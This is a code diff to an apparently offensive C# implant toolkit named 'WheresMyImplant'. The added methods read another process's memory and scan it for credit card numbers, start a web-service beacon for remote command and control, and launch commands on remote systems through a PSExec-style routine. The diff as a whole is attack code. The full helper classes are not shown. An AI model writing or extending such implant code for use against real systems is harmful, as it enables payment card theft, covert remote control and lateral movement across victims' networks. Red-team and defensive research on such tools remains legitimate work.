@@ -474,6 +474,39 @@ namespace WheresMyImplant
             return output.ToString();
         }
 
+        [ManagementTask]
+        public static String ReadProcessMemory(String processId)
+        {
+            StringBuilder output = new StringBuilder();
+            Int32 pid;
+            if (!Int32.TryParse(processId, out pid))
+            {
+                return output.ToString();
+            }
+
+            ReadProcessMemory readProcessMemory = new ReadProcessMemory(pid);
+            if (!readProcessMemory.OpenProcess())
+            {
+                return output.ToString();
+            }
+            readProcessMemory.ReadProcesMemory();
+            output.Append(readProcessMemory.GetOutput());
+            output.Append("\n-----\n");
+            output.Append(CheckCCNumber(readProcessMemory.GetPrintableMemory()));
+            return output.ToString();
+        }
+
+        [ManagementTask]
+        public static String CheckCCNumber(String input)
+        {
+            StringBuilder output = new StringBuilder();
+            foreach (String number in CheckCreditCard.CheckString(input))
+            {
+                output.Append(number);
+            }
+            return output.ToString();
+        }
+
         //FormalChicken
         public static void StartSmbServer(String pipeName)
         {
@@ -496,13 +529,55 @@ namespace WheresMyImplant
         }
 
         //DiscoChicken
+        public static void StartWebServiceBeacon(String socket, String provider, String retries)
+        {
+            Int32 retriesCount;
+            if (!Int32.TryParse(retries, out retriesCount))
+            {
+                retriesCount = 0;
+            }
+
+            using (WebServiceBeacon webServiceBeacon = new WebServiceBeacon(socket, provider))
+            {
+                Console.WriteLine("Starting Web Servic Beacon");
+                webServiceBeacon.SetRetries(retriesCount);
+                webServiceBeacon.Run();
+            }
+        }
+
+        public static void PSExec(String system, String execute, String isCommand)
+        {
+            Boolean comspec;
+            if (!Boolean.TryParse(isCommand, out comspec))
+            {
+                comspec = false;
+            }
+
+            using (PSExec psexec = new PSExec())
+            {
+                psexec.Connect(system);
+                String command = execute;
+                if (comspec)
+                {
+                    command = String.Format("%COMSPEC% /C start {0}", execute);
+                }
+                psexec.Create(command);
+                psexec.Open();
+                psexec.Start();
+            }
+        }
+
+        /*
+        //DiscoChicken
         public static void StartWebServiceBeacon(String socket, String provider)
         {
             using (WebServiceBeacon webServiceBeacon = new WebServiceBeacon(socket, provider))
             {
                 Console.WriteLine("Starting Web Servic Beacon");
+                webServiceBeacon.SetRetries(0);
                 webServiceBeacon.Run();
             }
         }
+        */ 
     }
 }
